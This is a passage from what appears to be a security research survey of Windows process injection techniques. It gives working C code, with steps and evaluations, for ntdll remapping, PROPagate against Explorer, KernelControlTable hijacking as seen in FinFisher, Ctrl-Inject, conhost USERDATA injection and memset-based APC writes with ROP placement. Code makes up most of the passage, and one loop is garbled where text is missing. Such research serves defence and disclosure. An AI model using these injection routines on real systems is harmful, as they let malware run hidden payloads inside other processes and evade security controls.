target process (with at least read+execute permissions, and CFG-allowed).  
Execution code only (unstable): 
MODULEINFO ntdll_info; 
HANDLE ntdll= GetModuleHandleA("ntdll"); 
GetModuleInformation(GetCurrentProcess(), ntdll , &ntdll_info, 
sizeof(ntdll_info)); 
HANDLE p = OpenProcess(PROCESS_VM_OPERATION, FALSE, process_id); 
ntdll!NtUnmapViewOfSection(p, ntdll); 
// Use write primitive to allocate ntdll_info.SizeOfImage bytes at address ntdll 
in the target process,  
// and write the patched ntdll code there. 
Evaluation: 
• 
Prerequisites: target memory must be RX (at least) 
• 
Limitations: none 
• 
CFG/CIG-readiness: not affected. 
• 
Control over registers: no 
• 
Stability: code should take care to retain the state of the module’s static variables (it’s 
impossible to unmap partial module memory), and flush the instruction cache. This 
needs to be done while the target process is suspended. This requires a memory read 
primitive (e.g. ReadProcessMemory), and process suspend+resume. 
• 
Cleanup required: none 
A full exploit code (including stability logic and payload writing): 
MODULEINFO ntdll_info; 
HANDLE ntdll= GetModuleHandleA("ntdll"); 
GetModuleInformation(GetCurrentProcess(), ntdll , &ntdll_info, 
sizeof(ntdll_info)); 
HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 
0, ntdll_info.SizeOfImage, NULL); 
LPVOID map_addr =MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0); 
HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | 
PROCESS_SUSPEND_RESUME, FALSE, process_id); 
ntdll!NtSuspendProcess(p); 
ReadProcessMemory(p, ntdll, map_addr, ntdll_info.SizeOfImage, NULL);  
// Patch NtClose in map_addr 
// … 
ntdll!NtUnmapViewOfSection(p, ntdll); 
SIZE_T view_size=0; 
ntdll!NtMapViewOfSection(fm, p, &ntdll, 0, ntdll_info.SizeOfImage, NULL, 
&view_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE ); 
FlushInstructionCache(p, ntdll, ntdll_info.SizeOfImage); 
ntdll!NtResumeProcess(p); 
15. PROPagate execution method (2017) 
Invented by Adam, Hexacorn (http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-
code-injection-trick/). 
Hat tip to Csaba Fitzl (“theevilbit”) who wrote the implementation upon which our code is based 
(https://github.com/theevilbit/injection/tree/master/PROPagate). 
a. Write the payload to the target process memory space using any write primitive available 
e.g. VirtualAllocEx and WriteProcessMemory (not shown). 
b. Find a subclassed window in the target process and obtain its UxSubclassInfo property 
(pointer to a structure) 
c. Read the structure from the target process memory (using any read primitive available, e.g. 
ReadProcessMemory) 
d. Clone the structure locally and set its virtual function to point at the payload address in the 
target memory 
e. Write the new structure to the target process memory (arbitrary location) using any write 
primitive available (e.g. VirtualAllocEx+WriteProcessMemory).  
f. Set the UxSubclassInfo property of the window to point at the new structure,  
g. Trigger execution by sending a message to the window. 
Code (tailored for Explorer.exe): 
HWND h = FindWindow("Shell_TrayWnd", NULL); 
DWORD process_id; 
GetWindowThreadProcessId(h, &process_id); 
HWND hst = GetDlgItem(h, 303); // System Tray 
HWND hc = GetDlgItem(hst, 1504); 
HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id); 
char new_subclass[0x50]; 
HANDLE target_new_subclass = (HANDLE)VirtualAllocEx(p, NULL, sizeof(new_subclass), 
MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); 
HANDLE old_subclass = GetProp(hc, "UxSubclassInfo"); //handle is the memory 
address of the current subclass structure 
ReadProcessMemory(p, (LPCVOID)old_subclass, (LPVOID)new_subclass, 
sizeof(new_subclass), NULL); 
DWORD64 target_execution_ptr_value=target_execution; 
memcpy(new_subclass + 0x18, &target_execution_ptr_value, 
sizeof(target_execution_ptr_value)); 
WriteProcessMemory(p, (LPVOID)(target_new_subclass), (LPVOID)new_subclass, 
sizeof(new_subclass), NULL); // Or any other write memory primitive 
SetProp(hc, "UxSubclassInfo", target_new_subclass); 
PostMessage(hc, WM_KEYDOWN, VK_NUMPAD1, 0); 
Sleep(1); // YMMV 
SetProp(hc, "UxSubclassInfo", old_subclass); 
Evaluation: 
o Prerequisites: A window belonging to the target process, that is subclassed. Specifically, 
one of Explorer’s System Tray sub-windows is subclassed. Target address must be RX (at 
least) 
o Limitations: none 
o CFG/CIG-readiness: the target execution address must be CFG-valid. 
o Control over registers: none 
o Cleanup required: yes. The original subclass structure needs to be restored. 
16. KernelControlTable execution method (FinFisher/FinSpy 2018) 
Observed in the wild, in FinFisher/FinSpy 
(https://www.microsoft.com/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-
defeating-traps-tricks-and-complex-virtual-machines/). Works only with processes that own a 
window. Odzhan provides a nice PoC (https://github.com/odzhan/injection/tree/master/kct) on 
which our code is based. 
a. Write code/data using e.g. using VirtualAllocEx and WriteProcessMemory. 
b. Obtain PEB address of target process using NtQueryInformationProcess, read it to find 
the location of the kernel callback table and read it. 
c. Write a new kernel callback table with the address of __fnCOPYDATA modified to point 
at the target code. 
d. Trigger the target code by sending WM_COPYDATA message to a window owned by the 
target process. 
HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION| PROCESS_VM_OPERATION| 
PROCESS_VM_READ| PROCESS_VM_WRITE, FALSE, process_id); 
PROCESS_BASIC_INFORMATION pbi; 
ntdll!NtQueryInformationProcess(p,ProcessBasicInformation, &pbi, sizeof(pbi), 
NULL); 
PEB peb; 
ReadProcessMemory(p, pbi.PebBaseAddress, &peb, sizeof(peb), NULL); 
KERNELCALLBACKTABLE kct; 
ReadProcessMemory(p, peb.KernelCallbackTable, &kct, sizeof(kct), NULL); 
LPVOID target_payload = VirtualAllocEx(p, NULL, sizeof(payload),MEM_RESERVE | 
MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
WriteProcessMemory(p, target_payload, payload, sizeof(payload), NULL); 
LPVOID target_kct = VirtualAllocEx(p, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, 
PAGE_READWRITE); 
kct.__fnCOPYDATA = (ULONG_PTR)target_payload; 
WriteProcessMemory(p, target_kct, &kct, sizeof(kct), NULL); 
WriteProcessMemory(p, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, 
KernelCallbackTable), &target_kct, sizeof(ULONG_PTR), NULL); 
COPYDATASTRUCT cds; 
cds.dwData = 1; 
wchar_t msg[] = L"foo"; 
cds.cbData = lstrlenW(msg) * 2; 
cds.lpData = msg; 
SendMessage(hw, WM_COPYDATA, (WPARAM)hw, (LPARAM)&cds); // hw can be obtained via 
e.g. EnumWindows 
// Cleanup 
WriteProcessMemory(p, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, 
KernelCallbackTable), &peb.KernelCallbackTable, sizeof(ULONG_PTR), NULL); 
Evaluation: 
o Prerequisites: The target process must own a window. The target address must be RX 
(at least) 
o Limitations: none 
o CFG/CIG-readiness: the target execution address must be CFG-valid. 
o Control over registers: none 
o Cleanup required: yes. The original kernel callback table must be restored. 
17. Ctrl-Inject execution method (2018) 
Invented by Rotem Kerner, EnSilo (https://blog.ensilo.com/ctrl-inject). 
Works only on console applications. 
a. Write code/data using e.g. VirtualAllocEx and WriteProcessMemory (not shown) 
b. Use RtlEncodeRemotePointer(process_handle, ptr, &encoded_ptr) to get encoded 
pointer for the payload (or the ROP gadget) 
c. Write the encoded ptr to kernelbase!SingleHandler using e.g. WriteProcessMemory.  
d. Trigger execution by simulating Ctrl-C (SendInput for Ctrl, followed by 
PostMessage(handle to window,WM_KEYDOWN,’C’,0) for ‘C’). 
HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, 
process_id); // PROCESS_VM_OPERATION is required for RtlEncodeRemotePointer 
void* encoded_addr = NULL; 
ntdll!RtlEncodeRemotePointer(h, target_execution, &encoded_addr); 
// Use any Memory Write Primitive here… 
WriteProcessMemory(h, kernelbase!SingleHandler, &encoded_addr, 8, NULL); 
INPUT ip; 
ip.type = INPUT_KEYBOARD; 
ip.ki.wScan = 0; 
ip.ki.time = 0; 
ip.ki.dwExtraInfo = 0; 
ip.ki.wVk = VK_CONTROL; 
ip.ki.dwFlags = 0; // 0 for key press 
SendInput(1, &ip, sizeof(INPUT)); 
Sleep(100); 
PostMessageA(hWindow, WM_KEYDOWN, 'C', 0); // hWindow is a handle to the 
application window 
Evaluation: 
o Prerequisites: Console application, Target address must be RX (at least) 
o Limitations: none 
o CFG/CIG-readiness: the target execution address must be CFG-valid. 
o Control over registers: none 
o Cleanup required: yes. The original Ctrl-C handler must be restored, also the key pressed 
must be released… 
Cleanup code: 
// release the Ctrl key 
Sleep(100); 
ip.type = INPUT_KEYBOARD; 
ip.ki.wScan = 0; 
ip.ki.time = 0; 
ip.ki.dwExtraInfo = 0; 
ip.ki.wVk = VK_CONTROL; 
ip.ki.dwFlags = KEYEVENTF_KEYUP;  
SendInput(1, &ip, sizeof(INPUT)); 
// Restore the original Ctrl handler in the target process 
ntdll!RtlEncodeRemotePointer(h, kernelbase!DefaultHandler, &encoded_addr); 
// Use any Memory Write Primitive here… 
WriteProcessMemory(h, kernelbase!SingleHandler, &encoded_addr, 8, NULL); 
18. Service Control Handler execution method (2018) 
Invented by Odzhan (https://modexp.wordpress.com/2018/08/30/windows-process-injection-
control-handler/). Limited to services, and quite complicated. In essence, it overwrites an 
internal service structure (IDE) in the target service process (the attacker needs to first find the 
IDE in the process memory, apparently there’s not elegant way of doing it other than going over 
all RW sections of the target process memory and searching for the IDE structure) using any 
write primitive. The PoC is too long to provide here (it can be found in our git repository). It is 
based on https://github.com/odzhan/injection/tree/master/svcctrl. 
19. Message passing write primitive (2018) 
Odzhan discusses the possibility of writing to a process using message passing APIs 
(https://modexp.wordpress.com/2018/07/15/process-injection-sharing-payload/). He toyed 
with using WM_COPYDATA message (sent via SendMessage/PostMessage) and discovered that 
the data wound up on the stack of the listening thread. However, this is not a stable condition 
and as such cannot be used for reliable exploitation. 
20. USERDATA execution method (2018) 
Invented by Odzhan (https://modexp.wordpress.com/2018/09/12/process-injection-user-
data/). Injects into the conhost.exe process associated with a desktop application. Our PoC is 
based on Odzhan’s code (https://github.com/odzhan/injection/tree/master/conhost).  
a. Write code/data using e.g. using VirtualAllocEx and WriteProcessMemory. 
b. Get the pointer to the user data virtual table using GetWindowLongPtr(…, 
GWLP_USERDATA) 
c. Read the virtual table 
d. Read the console dispatch table 
e. Make a copy of the dispatch table in memory, with a modified pointer for 
GetWindowHandle pointing at a target code 
f. Trigger the target code using SendMessage(…, WM_SETFOCUS, …) 
g. Restore the pointer to the original dispatch table. 
Code: 
DWORD conhost_id = conhostId(process_id); 
HANDLE hp = OpenProcess(PROCESS_VM_READ|PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 
FALSE, conhost_id); 
LPVOID target_payload = VirtualAllocEx(hp, NULL, sizeof(payload), MEM_COMMIT | 
MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
WriteProcessMemory(hp, target_payload, payload, sizeof(payload), NULL); 
LONG_PTR udptr = GetWindowLongPtr(hWindow, GWLP_USERDATA); 
ULONG_PTR vTable; 
ReadProcessMemory(hp, (LPVOID)udptr, (LPVOID)&vTable, sizeof(ULONG_PTR), NULL); 
ConsoleWindow cw; 
ReadProcessMemory(hp, (LPVOID)vTable, (LPVOID)&cw, sizeof(ConsoleWindow), NULL); 
LPVOID target_cw = VirtualAllocEx(hp, NULL, sizeof(ConsoleWindow), MEM_COMMIT | 
MEM_RESERVE, PAGE_READWRITE); 
cw.GetWindowHandle = (ULONG_PTR)target_payload; 
WriteProcessMemory(hp, target_cw, &cw, sizeof(ConsoleWindow), NULL); 
WriteProcessMemory(hp, (LPVOID)udptr, &target_cw, sizeof(ULONG_PTR), NULL); 
SendMessage(hWindow, WM_SETFOCUS, 0, 0); 
WriteProcessMemory(hp, (LPVOID)udptr, &vTable, sizeof(ULONG_PTR), NULL); 
NOTE: the process_id provided must have conshot.exe as its child (so when the application is 
run from a command line, process_id must belong to the cmd.exe process). hWindow is a 
window belonging to the process whose ID is process_id.  
Evaluation: 
o Prerequisites: Console application, Target address must be RX (at least) 
o Limitations: none 
o CFG/CIG-readiness: the target execution address must be CFG-valid. 
o Control over registers: none 
o Cleanup required: yes. The original virtual table needs to be restored. 
21. ALPC execution method (2019) 
Invented by Odzhan (https://modexp.wordpress.com/2019/03/07/process-injection-print-
spooler/). Limited to processes that have ALPC ports. The PoC is too long to provide here (it can 
be found in our git repository), it is based on the code snippets in the blog post, as well as on 
https://github.com/odzhan/injection/tree/master/spooler.  
a. Search for an (undocumented) ALPC control data structure that contains a callback. 
b. Memory writing primitive is used to overwrite the callback address 
c. The injecting process enumerates over all ports and attempts to connect to each one in 
order to trigger the callback.  
NOTE: in Windows 10 version 1903 the ALPC port is 46 (as opposed to 45 in earlier versions). 
Evaluation:  
o Prerequisites: process uses ALPC ports, target address must be RX (at least) 
o Limitations: none 
o CFG/CIG-readiness: the target execution address must be CFG-valid. 
o Control over registers: none 
o Cleanup required: yes. The original callback needs to be restored. 
22. CLIPBRDWNDCLASS execution method (2019) 
Hypothesized by Adam, Hexacorn (https://modexp.wordpress.com/2019/05/24/4066/) in 2018, 
and implemented by Odzhan (https://modexp.wordpress.com/2019/05/24/4066/) in 2019. 
Limited to processes that have private clipboard windows. This is somewhat unreliable, since 
some processes like Explorer may or may not have a private window throughout their lifetime.  
The technique uses SetProp to set the clipboard window property ClipboardDataObjectInterface 
to an object (IUnknown) whose Release virtual function points at the target code. Then 
execution is triggered by posting a message of type WM_DESTROYCLIPBOARD to the clipboard 
window (which eventually invokes the Release function of the object). 
Bottom line: not a reliable execution technique (requires private clipboard window). 
23. DnsQuery_A Callback execution method (2019) 
Invented by Adam, Hexacorn (http://www.hexacorn.com/blog/2019/06/12/code-execution-via-
surgical-callback-overwrites-e-g-dns-memory-functions/). Limited to processes that require DNS 
resolution (i.e. invoke DnsQuery). DnsQuery invokes DnsApi!pDnsAllocFunction (function 
pointer) to allocate memory, so modifying this pointer to point at a target code/function yields 
execution. The execution technique is implemented in 3 steps: (a) find the address of the DnsApi 
module in the target process; (b) overwrite its pDnsAllocFunction (a known offset from the 
beginning of DnsApi) with the pointer of target code; (c) Trigger DnsQuery_A in the target 
process. Unfortunately, step (c) is not easily achieved, therefore this technique is not too 
reliable. 
Bottom line: not a reliable execution technique (as it requires triggering DnsQuery_A). 
24. WNF (Windows Notification Facility) execution method (2019) 
Invented by Odzhan (https://modexp.wordpress.com/2019/06/15/4083/). Limited to processes 
that use WNF (this is probably quite rare, so far we’ve only found one such process – 
explorer.exe). The code itself is too long to be included here (it can be found in our git 
repository). 
a. Search for the “master” WNF subscription table 
b. Traverse a linked-list of name entries to find the entry matching a specific notification 
name (WNF_SHEL_APPLICATION_STARTED) 
c. Locate the user subscription entry from that entry. The user subscription entry contains 
a callback. This callback is overwritten with an attacker-provided pointer to code 
d. Trigger the notification using NtUpdateWnfStateData. 
NOTE: we improved on the original implementation by finding the WNF subscription table via 
references in the NTDLL code.  
25. memset/memmove write primitive (NEW! 2019) 
Invented by Amit Klein, Itzik Kotler, Safebreach. Requires an alertable thread. 
a. Execute memset (using NtQueueApcThread) to write a single byte to the target process. 
b. Repeat (a) until all bytes are written. 
c. If needed, copy the data atomically (via NtQueueApcThread  invoking memmove) 
HANDLE ntdll= GetModuleHandleA("ntdll"); 
HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id); 
for (int i = 0; i  NtDelayExecution, WaitForSingleObjectEx -> NtWaitForSingleObject, 
WaitForMultipleObjectsEx -> NtWaitForMultipleObjects, SignalObjectAndWait -> 
NtSignalAndWaitForSingleObject, RealMsgWaitForMultipleObjectsEx -> 
NtUserMsgWaitForMultipleObjectsEx). These five NtXXX functions use the following template: 
mov r10,rcx 
mov eax,SERVICE_DESCRIPTOR 
test byte ptr [SharedUserData+0x308],1 
jne +3 
syscall 
ret 
int 2E 
ret 
So these functions don’t use the stack, therefore RSP ==TOS contains the return address, hence 
we know exactly where to place the ROP chain.  
We can generalize this – knowing RIP usually allows us to determine where the return address 
is, relative to RSP. The above case becomes a special case wherein the return address offset 
relative to RSP is 0 (when RIP is NtXXX+0x14 for the five NtXXX functions named above).  
Naïve code: 
HANDLE ntdll= GetModuleHandleA("ntdll"); 
HANDLE t = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | 
THREAD_SUSPEND_RESUME, FALSE, thread_id); 
SuspendThread(t); 
CONTEXT ctx; 
ctx.ContextFlags = CONTEXT_ALL; 
GetThreadContext(t, &ctx); 
DWORD64 tos = (DWORD64)ctx.Rsp; 
for (int i = 0; i < sizeof(ROP_chain); i++) 
{ 
ntdll!NtQueueApcThread(t, GetProcAddress(ntdll, "memset"), (void*)(tos+i), 
(void*)*(((BYTE*)ROP_chain)+i), 1); 
} 
ResumeThread(t); 
Of course, this technique ruins the current stack, so there’s no way to resume the original 
thread flow. There are several alternatives:  
• 
Backup the current stack first (using memmove), then restore it and the registers. Note: 
in order to accommodate the backup stack, the stack can be grown by writing a dummy 
value every 4KB (allocating a new page each time). 